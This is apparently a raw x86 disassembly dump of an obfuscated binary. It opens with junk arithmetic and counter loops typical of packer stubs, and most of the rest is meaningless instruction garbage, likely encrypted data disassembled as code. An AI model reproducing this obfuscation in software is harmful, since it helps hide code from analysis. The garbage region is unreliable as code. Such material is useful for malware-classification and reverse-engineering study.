  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4336eb
  40c301:	adc    DWORD PTR ds:0x4336fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43364b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433687
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4336e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43362f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4336a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433633,0x433667
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4336ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4336ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4336ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4336ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4336ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4336ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4336ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4336ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43366b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4336ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4336ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43372b,0x43373b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4336af,0x4336bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4336c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433637,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43362b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43362f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433623,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4336e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4336f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4336a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4336eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4336eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4336eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4336eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4336eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4336eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4336eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4336eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4336eb
  40c4ce:	and    esi,DWORD PTR ds:0x4336ef
  40c4d4:	mov    DWORD PTR ds:0x4336eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4336bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433683,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43366f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4336fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4336eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4336f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0xbf405658
  40c577:	repz pop ss
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	push   edx
  40c582:	mov    DWORD PTR [ebx],0x73fce9d6
  40c588:	inc    edi
  40c589:	jg     0x40c5a8
  40c58b:	jnp    0x40c5cb
  40c58d:	je     0x40c590
  40c58f:	sbb    BYTE PTR [edx],0xd0
  40c592:	adc    eax,0x537a458b
  40c597:	in     al,dx
  40c598:	inc    eax
  40c599:	mov    al,0x93
  40c59b:	clc    
  40c59c:	add    dh,BYTE PTR [ecx+0x3ed82392]
  40c5a2:	(bad)  
  40c5a3:	mov    edx,0x9a3db837
  40c5a8:	mov    fs,ebx
  40c5aa:	xor    eax,0x8da208f
  40c5af:	xchg   esi,eax
  40c5b0:	cmp    al,0xe1
  40c5b2:	add    al,0xd6
  40c5b4:	bound  eax,QWORD PTR [ecx+0x2d]
  40c5b7:	mov    eax,ds:0xb06dff7a
  40c5bc:	xchg   ecx,eax
  40c5bd:	imul   ecx,DWORD PTR [eax],0x87b048b2
  40c5c3:	or     eax,0x4d4615a4
  40c5c8:	call   0xea50344e
  40c5cd:	ins    DWORD PTR es:[edi],dx
  40c5ce:	fwait
  40c5cf:	add    ah,dl
  40c5d1:	ins    BYTE PTR es:[edi],dx
  40c5d2:	push   0xffffff95
  40c5d4:	xchg   esp,eax
  40c5d5:	or     bl,BYTE PTR [edi-0x26af8c1c]
  40c5db:	pop    edi
  40c5dc:	dec    ebx
  40c5dd:	(bad)  [esi]
  40c5df:	data16 loopne 0x40c5fc
  40c5e2:	mov    cl,0x21
  40c5e4:	dec    ecx
  40c5e5:	outs   dx,BYTE PTR ds:[esi]
  40c5e6:	bound  ecx,QWORD PTR [ecx]
  40c5e8:	shl    DWORD PTR [edx],cl
  40c5ea:	repz dec edx
  40c5ec:	lea    edi,[ebx]
  40c5ee:	cmp    DWORD PTR [eax-0x7e0be36f],edx
  40c5f4:	les    eax,FWORD PTR [ecx+ecx*1+0x58c1402]
  40c5fb:	fnstcw WORD PTR [ecx]
  40c5fd:	daa    
  40c5fe:	inc    ebx
  40c5ff:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c601:	stos   DWORD PTR es:[edi],eax
  40c602:	sub    DWORD PTR [esi-0x1e7c52c7],0x79
  40c609:	or     DWORD PTR [eax-0x73],esp
  40c60c:	fmul   DWORD PTR [eax+0x7]
  40c60f:	jne    0x40c60d
  40c611:	stc    
  40c612:	call   0xc1c14b9c
  40c617:	stos   BYTE PTR es:[edi],al
  40c618:	mov    bl,0xb2
  40c61a:	cdq    
  40c61b:	div    DWORD PTR [esi+0x2a]
  40c61e:	test   eax,0x3906cba3
  40c623:	xor    eax,0xe7c54db1
  40c628:	test   BYTE PTR [eax],0x15
  40c62b:	out    dx,al
  40c62c:	or     eax,eax
  40c62e:	xchg   edi,eax
  40c62f:	rol    BYTE PTR [esi],1
  40c631:	es fs xor al,0x7b
  40c635:	scas   al,BYTE PTR es:[edi]
  40c636:	ret    
  40c637:	gs fwait
  40c639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c63a:	inc    ecx
  40c63b:	imul   ebp,esp,0x4d
  40c63e:	imul   ebx,DWORD PTR [eax-0x5d279d6d],0xffffffcb
  40c645:	je     0x40c5f0
  40c647:	dec    esi
  40c648:	xchg   edx,eax
  40c649:	or     DWORD PTR [eax-0x28],ecx
  40c64c:	mov    edi,0x5911964c
  40c651:	pop    ebp
  40c652:	dec    ebx
  40c653:	ficomp DWORD PTR [ecx+0x722b093d]
  40c659:	push   ebx
  40c65a:	add    ecx,DWORD PTR [esi+0x75fb78bf]
  40c660:	ds push esp
  40c662:	mov    ds:0x66b897e2,al
  40c667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c668:	les    edx,FWORD PTR [esi+0x2931a514]
  40c66e:	icebp  
  40c66f:	sbb    eax,0x5c5961d6
  40c674:	mov    ebp,ss
  40c676:	mov    eax,0xa0642d82
  40c67b:	inc    ecx
  40c67c:	xor    bh,bh
  40c67e:	cli    
  40c67f:	and    ecx,DWORD PTR [eax]
  40c681:	inc    esp
  40c682:	inc    edi
  40c683:	enter  0xd937,0x3c
  40c687:	xchg   BYTE PTR [edx],ch
  40c689:	nop
  40c68a:	lahf   
  40c68b:	dec    edx
  40c68c:	lods   eax,DWORD PTR ds:[esi]
  40c68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c68e:	add    BYTE PTR [ebx],ah
  40c690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c691:	out    0x98,al
  40c693:	and    esi,DWORD PTR [ebx-0x8]
  40c696:	add    al,0x2
  40c698:	mov    edi,0x31efb1e1
  40c69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c69e:	add    DWORD PTR [ebp-0x30],edi
  40c6a1:	sbb    edx,DWORD PTR [edx-0x2c4c5ef8]
  40c6a7:	xchg   esi,eax
  40c6a8:	dec    edx
  40c6a9:	ins    BYTE PTR es:[edi],dx
  40c6aa:	pop    esi
  40c6ab:	sar    BYTE PTR [edi],cl
  40c6ad:	sub    DWORD PTR [eax],eax
  40c6af:	cmc    
  40c6b0:	jbe    0x40c68f
  40c6b2:	pop    edi
  40c6b3:	int3   
  40c6b4:	cs push 0xd3f2a833
  40c6ba:	xlat   BYTE PTR ds:[ebx]
  40c6bb:	pusha  
  40c6bc:	(bad)  
  40c6bd:	scas   eax,DWORD PTR es:[edi]
  40c6be:	fcom   DWORD PTR [eax-0x60]
  40c6c1:	daa    
  40c6c2:	xchg   BYTE PTR [ecx],bh
  40c6c4:	fwait
  40c6c5:	mov    dh,al
  40c6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c8:	push   0x828552b8
  40c6cd:	mul    BYTE PTR [esp+esi*2-0x7dc516fe]
  40c6d4:	mov    DWORD PTR [eax],ebp
  40c6d6:	rcl    BYTE PTR [ecx-0x687895a4],cl
  40c6dc:	jbe    0x40c73f
  40c6de:	fs and al,0xe3
  40c6e1:	add    al,0xb4
  40c6e3:	push   es
  40c6e4:	sti    
  40c6e5:	(bad)
  40c6e8:	daa    
  40c6e9:	xchg   esp,eax
  40c6ea:	pop    ebp
  40c6eb:	mov    dl,0x24
  40c6ed:	int3   
  40c6ee:	push   esp
  40c6ef:	pushw  ds
  40c6f1:	cmp    al,0x3f
  40c6f3:	and    DWORD PTR [esi-0x40],0x13abe600
  40c6fa:	mov    BYTE PTR [esi-0x3e],al
  40c6fd:	and    DWORD PTR [ebx],edx
  40c6ff:	stos   BYTE PTR es:[edi],al
  40c700:	leave  
  40c701:	mov    dl,0xa6
  40c703:	aam    0x82
  40c705:	push   edi
  40c706:	push   es
  40c707:	mov    ch,0x2d
  40c709:	jge    0x40c6b6
  40c70b:	mov    dh,0x3
  40c70d:	pushf  
  40c70e:	pop    ss
  40c70f:	popa   
  40c710:	test   DWORD PTR [ebp+0x66],edx
  40c713:	and    DWORD PTR [esi+0x78],ebx
  40c716:	jle    0x40c720
  40c718:	stc    
  40c719:	fst    QWORD PTR [eax-0x20]
  40c71c:	nop
  40c71d:	test   DWORD PTR [eax-0x26],ebx
  40c720:	dec    ebx
  40c721:	sar    BYTE PTR [ebx+0x14],cl
  40c724:	lods   al,BYTE PTR ds:[esi]
  40c725:	push   ds
  40c726:	ss xchg esi,eax
  40c728:	and    eax,0xf34f1627
  40c72d:	adc    al,0x95
  40c72f:	cmp    eax,0x4c9ae98a
  40c734:	out    dx,al
  40c735:	add    ecx,DWORD PTR [edi+0x6f]
  40c738:	push   cs
  40c739:	mov    esp,ebp
  40c73b:	mov    ds:0xd91769b3,al
  40c740:	xchg   BYTE PTR ds:0x2b9fca7d,al
  40c746:	mov    ds:0x71297bbb,al
  40c74b:	push   edi
  40c74c:	cmp    BYTE PTR [esi-0x18],bh
  40c74f:	ins    BYTE PTR es:[edi],dx
  40c750:	das    
  40c751:	pop    ebx
  40c752:	inc    ebx
  40c753:	push   0x54
  40c755:	pop    eax
  40c756:	pop    eax
  40c757:	pushf  
  40c758:	scas   al,BYTE PTR es:[edi]
  40c759:	add    al,0xc3
  40c75b:	add    dh,dh
  40c75d:	cdq    
  40c75e:	xor    DWORD PTR [ebx+ebx*4-0x2db65ba8],eax
  40c765:	cmc    
  40c766:	xor    cl,BYTE PTR [edx]
  40c768:	pop    edi
  40c769:	dec    ebp
  40c76a:	ss dec eax
  40c76c:	push   0xe11acc7c
  40c771:	sub    eax,0x59f6156c
  40c776:	xchg   edx,eax
  40c777:	jle    0x40c7ee
  40c779:	mov    ebp,0x4f35c328
  40c77e:	xchg   ebx,eax
  40c77f:	pop    fs
  40c781:	arpl   WORD PTR [edx+0xa],dx
  40c784:	(bad)  [edx]
  40c786:	add    BYTE PTR [ecx],cl
  40c788:	test   BYTE PTR [ecx+0x29fe80ae],bh
  40c78e:	or     esp,DWORD PTR ds:0x3a370373
  40c794:	out    0x88,al
  40c796:	xlat   BYTE PTR ds:[ebx]
  40c797:	add    eax,0xce001632
  40c79c:	mov    eax,ds:0x5f923067
  40c7a1:	lods   eax,DWORD PTR ds:[esi]
  40c7a2:	pop    ss
  40c7a3:	adc    al,0x4d
  40c7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7a6:	imul   ecx,DWORD PTR [eax-0x31f3ba4c],0x63ce05f
  40c7b0:	pushf  
  40c7b1:	mov    ds:0x95dacbf5,al
  40c7b6:	pop    eax
  40c7b7:	sbb    esi,esp
  40c7b9:	test   al,0x1b
  40c7bb:	inc    edx
  40c7bc:	test   al,0xd8
  40c7be:	pop    edi
  40c7bf:	dec    edi
  40c7c0:	jg     0x40c83c
  40c7c2:	stos   BYTE PTR es:[edi],al
  40c7c3:	(bad)  
  40c7c4:	es dec ecx
  40c7c6:	jp     0x40c7f8
  40c7c8:	mov    ebx,0xe0c1c1ce
  40c7cd:	or     dl,BYTE PTR [ebx]
  40c7cf:	in     eax,0xb9
  40c7d1:	aam    0x79
  40c7d3:	push   ds
  40c7d4:	xchg   ecx,eax
  40c7d5:	jae    0x40c79b
  40c7d7:	in     al,dx
  40c7d8:	mov    esp,0xd0624d1d
  40c7dd:	xlat   BYTE PTR ds:[ebx]
  40c7de:	bound  edx,QWORD PTR [ebx]
  40c7e0:	push   0x1f3e4580
  40c7e5:	jne    0x40c7ad
  40c7e7:	cmp    BYTE PTR [edi+0x652231e6],bl
  40c7ed:	gs ins DWORD PTR es:[edi],dx
  40c7ef:	push   es
  40c7f0:	push   cs
  40c7f1:	jecxz  0x40c848
  40c7f3:	xchg   esp,eax
  40c7f4:	retf   0xeafb
  40c7f7:	stos   DWORD PTR es:[edi],eax
  40c7f8:	loopne 0x40c836
  40c7fa:	and    eax,0xc8d7b744
  40c7ff:	imul   ebp,edx,0x6fb3eceb
  40c805:	in     eax,0xf
  40c807:	cli    
  40c808:	xor    BYTE PTR [esi],al
  40c80a:	add    BYTE PTR ds:[edi-0x7d147720],bh
  40c811:	cwde   
  40c812:	mov    bl,0xab
  40c814:	adc    al,0x4
  40c816:	stos   DWORD PTR es:[edi],eax
  40c817:	es xchg edx,eax
  40c819:	xlat   BYTE PTR ds:[ebx]
  40c81a:	(bad)  
  40c81b:	ficomp WORD PTR [eax-0x3f]
  40c81e:	xor    ebx,esi
  40c820:	stc    
  40c821:	imul   ebx,DWORD PTR [edi+0x53],0xffffffa5
  40c825:	xchg   ecx,eax
  40c826:	mov    bh,0x75
  40c828:	and    cl,BYTE PTR [ecx-0x5bf91664]
  40c82e:	dec    edx
  40c82f:	adc    BYTE PTR [esi-0x422e795],cl
  40c835:	add    edx,DWORD PTR [esi]
  40c837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c838:	and    ebp,edi
  40c83a:	sbb    dh,BYTE PTR es:[ebp+0x299e86f0]
  40c841:	pushf  
  40c842:	(bad)  
  40c844:	les    ecx,FWORD PTR [esp+eax*1]
  40c847:	inc    edx
  40c848:	jo     0x40c86e
  40c84a:	hlt    
  40c84b:	xor    bl,BYTE PTR [ebp+0x65]
  40c84e:	and    edx,edi
  40c850:	out    0xd8,al
  40c852:	in     al,0xe4
  40c854:	jns    0x40c8bc
  40c856:	ins    DWORD PTR es:[edi],dx
  40c857:	fadd   DWORD PTR [edx]
  40c859:	fdiv   QWORD PTR [esi]
  40c85b:	fimul  DWORD PTR [esi-0x6db33fe3]
  40c861:	int3   
  40c862:	call   0xe8a9:0x7142bb17
  40c869:	(bad)  
  40c86a:	out    dx,eax
  40c86b:	pop    ecx
  40c86c:	push   es
  40c86d:	add    al,0xde
  40c86f:	lods   al,BYTE PTR ds:[esi]
  40c870:	jle    0x40c8e1
  40c872:	test   BYTE PTR [esi+0x3e],dl
  40c875:	mov    al,ds:0xced9e137
  40c87a:	ret    
  40c87b:	push   ds
  40c87c:	mov    dl,0x6
  40c87e:	adc    al,0x49
  40c880:	or     al,BYTE PTR [ebx+eax*8]
  40c883:	and    eax,0x8bec458b
  40c888:	dec    ebp
  40c889:	or     BYTE PTR [ebx],al
  40c88b:	dec    eax
  40c88c:	sbb    al,0x33
  40c88e:	test   BYTE PTR [ecx+0x458bec4d],0xd8
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	cmc    
  40c8b3:	dec    ebx
  40c8b4:	shl    BYTE PTR ds:0x7e7e8c27,cl
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	inc    esp
  40c8bf:	ja     0x40c91f
  40c8c1:	adc    bh,BYTE PTR [ebx]
  40c8c3:	push   ds
  40c8c4:	nop
  40c8c5:	dec    edx
  40c8c6:	mov    al,ds:0x99b7fd10
  40c8cb:	jmp    0x40c8c6
  40c8cd:	lahf   
  40c8ce:	and    esp,DWORD PTR [ebx+0x2548106b]
  40c8d4:	(bad)
  40c8d7:	cmp    DWORD PTR [ecx+0x4867b01a],edx
  40c8dd:	repz lahf 
  40c8df:	out    0x9e,eax
  40c8e1:	dec    ebx
  40c8e2:	icebp  
  40c8e3:	lahf   
  40c8e4:	push   0xffffff8c
  40c8e6:	movlps xmm4,QWORD PTR [eax]
  40c8e9:	in     al,dx
  40c8ea:	bound  esp,QWORD PTR [edx]
  40c8ec:	xor    esi,DWORD PTR [edx+0x377705c9]
  40c8f2:	lods   al,BYTE PTR ds:[esi]
  40c8f3:	pop    edx
  40c8f4:	adc    esi,DWORD PTR [ebx+0x56]
  40c8f7:	(bad)  [eax+eax*2-0x3f]
  40c8fb:	(bad)  
  40c8fc:	sub    DWORD PTR [eax-0x48d72daf],edx
  40c902:	sbb    BYTE PTR [ebx],0xb5
  40c905:	mov    esi,0x92674d57
  40c90a:	popf   
  40c90b:	xchg   edi,eax
  40c90c:	jb     0x40c8c0
  40c90e:	mov    ch,0x39
  40c910:	sub    dl,BYTE PTR [esp+edi*2]
  40c913:	shl    BYTE PTR [ebx+0x7fd54283],cl
  40c919:	inc    eax
  40c91a:	bound  ecx,QWORD PTR [edi+0x6856b403]
  40c920:	fldenv [edi+0x6b]
  40c923:	and    al,0x93
  40c925:	mov    edx,0xe75807ea
  40c92a:	sbb    al,0xa9
  40c92c:	in     al,0x2e
  40c92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c92f:	xor    eax,DWORD PTR [ebx-0x339539f0]
  40c935:	adc    esi,DWORD PTR [eax]
  40c937:	inc    ebp
  40c938:	jmp    0x8f50:0xdc4dfb2d
  40c93f:	push   es
  40c940:	and    BYTE PTR [ebp+0x19],dl
  40c943:	test   BYTE PTR [edi],al
  40c945:	ud2    
  40c947:	mov    al,dl
  40c949:	stc    
  40c94a:	ficomp DWORD PTR [ebx-0x52]
  40c94d:	pop    edx
  40c94e:	push   edx
  40c94f:	or     eax,0x5124ff7a
  40c954:	in     eax,0xeb
  40c956:	repnz cdq 
  40c958:	mov    ebx,edx
  40c95a:	int3   
  40c95b:	in     al,dx
  40c95c:	outs   dx,BYTE PTR ds:[esi]
  40c95d:	push   ss
  40c95e:	loop   0x40c983
  40c960:	in     al,dx
  40c961:	std    
  40c962:	push   cs
  40c963:	imul   ebp,DWORD PTR [edi-0x4f82fa2d],0xffffff95
  40c96a:	xchg   esp,eax
  40c96b:	push   ecx
  40c96c:	push   ds
  40c96d:	jmp    0x9759:0x3bd742f8
  40c974:	enter  0x83c4,0x42
  40c978:	aas    
  40c979:	or     cl,bl
  40c97b:	out    0xf7,eax
  40c97d:	pusha  
  40c97e:	jo     0x40c977
  40c980:	dec    edi
  40c981:	jne    0x40c9a4
  40c983:	mov    ds:0xd57bb156,eax
  40c988:	xor    edi,DWORD PTR [edi+0x5bdb9c44]
  40c98e:	or     eax,0x43ab390f
  40c993:	retf   0xef8e
  40c996:	in     eax,dx
  40c997:	mov    ecx,0x6b050acc
  40c99c:	loop   0x40ca01
  40c99e:	dec    ebx
  40c99f:	js     0x40c93c
  40c9a1:	inc    eax
  40c9a2:	les    ebx,FWORD PTR [ecx+0x5ce9674a]
  40c9a8:	jg     0x40ca24
  40c9aa:	mov    ds,WORD PTR [ebp+0x75]
  40c9ad:	test   eax,0x4f98dfe3
  40c9b2:	sbb    BYTE PTR [ecx-0x75cbf90a],0x84
  40c9b9:	adc    BYTE PTR [ecx+0x3e1759c0],cl
  40c9bf:	outs   dx,DWORD PTR ds:[esi]
  40c9c0:	lods   eax,DWORD PTR ds:[esi]
  40c9c1:	into   
  40c9c2:	sahf   
  40c9c3:	mov    al,ds:0x10c0bd2a
  40c9c8:	xchg   DWORD PTR [edi+edx*4+0x3d],ebx
  40c9cc:	adc    esp,DWORD PTR [ebp-0x26]
  40c9cf:	cs das 
  40c9d1:	ss out dx,al
  40c9d3:	fnstsw WORD PTR [ecx+0x56]
  40c9d6:	inc    eax
  40c9d7:	jno    0x40c9e3
  40c9d9:	sub    al,0x39
  40c9db:	or     al,0x80
  40c9dd:	mov    edi,DWORD PTR [ebx-0x49f64c56]
  40c9e3:	sbb    al,0x89
  40c9e5:	jmp    0x40c9cb
  40c9e7:	cld    
  40c9e8:	aad    0x3f
  40c9ea:	sbb    BYTE PTR [ecx+0x6328de12],bh
  40c9f0:	mov    ds:0x8403b7a5,ax
  40c9f6:	out    dx,eax
  40c9f7:	test   eax,0xe2188513
  40c9fc:	mov    dl,0x88
  40c9fe:	lea    ebp,[eax]
  40ca00:	xlat   BYTE PTR ds:[ebx]
  40ca01:	or     bh,dl
  40ca03:	sbb    BYTE PTR [edx-0x29cb019a],0xe6
  40ca0a:	mov    BYTE PTR [edx],bl
  40ca0c:	mov    cs,WORD PTR [ebp-0x2c273022]
  40ca12:	nop
  40ca13:	push   ds
  40ca14:	mov    edi,0x60293fb3
  40ca19:	cmp    edx,DWORD PTR [ebx]
  40ca1b:	outs   dx,BYTE PTR gs:[esi]
  40ca1d:	dec    ebp
  40ca1e:	mov    edx,0x54a4a916
  40ca23:	data16 not BYTE PTR [eax+0x44191616]
  40ca2a:	jmp    0xe33252ce
  40ca2f:	mov    esp,0x82c8b0b1
  40ca34:	es jecxz 0x40ca6c
  40ca37:	imul   esp,eax,0xffffffdc
  40ca3a:	cmp    esi,DWORD PTR ds:0x6857b6f7
  40ca40:	call   0xc548:0xda2896
  40ca47:	rcl    al,0x90
  40ca4a:	add    al,0x21
  40ca4c:	retf   
  40ca4d:	inc    eax
  40ca4e:	pushf  
  40ca4f:	push   esp
  40ca50:	fild   DWORD PTR [eax]
  40ca52:	ds stc 
  40ca54:	popa   
  40ca55:	mov    esp,0xf127ea56
  40ca5a:	cmp    BYTE PTR ds:0x3ba90035,0x90
  40ca61:	loopne 0x40ca54
  40ca63:	popf   
  40ca64:	and    BYTE PTR [eax-0x9c6d140],0x41
  40ca6b:	adc    BYTE PTR [eax+0x209bfe68],0xf6
  40ca72:	(bad)  
  40ca73:	in     eax,0x62
  40ca75:	xor    eax,0xb076c461
  40ca7a:	stos   BYTE PTR es:[edi],al
  40ca7b:	inc    esi
  40ca7c:	lds    edx,FWORD PTR [edx+ebp*8-0x44bdc91f]
  40ca83:	and    dh,BYTE PTR [edi]
  40ca85:	xor    dh,BYTE PTR [ecx-0x2b]
  40ca88:	pop    ebp
  40ca89:	inc    esp
  40ca8a:	mov    eax,ds:0xd148a5c
  40ca8f:	xlat   BYTE PTR ds:[ebx]
  40ca90:	in     al,dx
  40ca91:	cmp    al,0xf2
  40ca93:	and    BYTE PTR [ebx-0x6386e9de],dh
  40ca99:	arpl   WORD PTR [esi],si
  40ca9b:	outs   dx,BYTE PTR ds:[esi]
  40ca9c:	jmp    0xab11:0xb1d21501
  40caa3:	test   BYTE PTR [edi],ah
  40caa5:	adc    eax,0xf00833f3
  40caaa:	out    0x5e,al
  40caac:	inc    ecx
  40caad:	cmp    eax,esp
  40caaf:	(bad)  
  40cab0:	adc    DWORD PTR [edx+0x26],edi
  40cab3:	pop    edi
  40cab4:	push   edx
  40cab5:	sar    BYTE PTR [eax-0x1433b406],0x98
  40cabc:	sbb    BYTE PTR [edx],ch
  40cabe:	adc    al,0x2c
  40cac0:	mov    eax,ds:0x59b9b080
  40cac5:	addr16 pop esi
  40cac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cac8:	les    esi,FWORD PTR [edi-0x52]
  40cacb:	push   ebp
  40cacc:	aaa    
  40cacd:	xchg   esi,eax
  40cace:	jge    0x40cb4c
  40cad0:	pop    ebp
  40cad1:	mov    ah,0xd1
  40cad3:	xor    eax,0x1db15848
  40cad8:	jnp    0x40cad5
  40cada:	xor    al,0x63
  40cadc:	fiadd  WORD PTR ds:0x6413d6aa
  40cae2:	shl    BYTE PTR [esi-0x2bb134c4],1
  40cae8:	int    0xb5
  40caea:	call   0xdc07:0x9793511e
  40caf1:	ss add al,bh
  40caf4:	jge    0x40cac9
  40caf6:	jae    0x40cb21
  40caf8:	call   0xc8bf:0x9cc50a2a
  40caff:	sub    eax,ecx
  40cb01:	push   0x1a56c06e
  40cb06:	rol    BYTE PTR [ebx-0x40f6ffd2],0x7f
  40cb0d:	sbb    DWORD PTR [edi+0x1bc60538],0x30aabaf8
  40cb17:	ins    BYTE PTR es:[edi],dx
  40cb18:	ins    DWORD PTR es:[edi],dx
  40cb19:	xchg   esi,eax
  40cb1a:	stos   DWORD PTR es:[edi],eax
  40cb1b:	imul   esp,DWORD PTR [ebp+0x3944d6b6],0x53
  40cb22:	pop    ebp
  40cb23:	cs mov ah,0xd7
  40cb26:	inc    eax
  40cb27:	enter  0x653e,0x83
  40cb2b:	inc    eax
  40cb2c:	ins    DWORD PTR es:[edi],dx
  40cb2d:	fs cs in eax,0xb2
  40cb31:	pop    esi
  40cb32:	sbb    dh,al
  40cb34:	push   esi
  40cb35:	in     al,0xb3
  40cb37:	fbld   TBYTE PTR [ebp-0x763adde9]
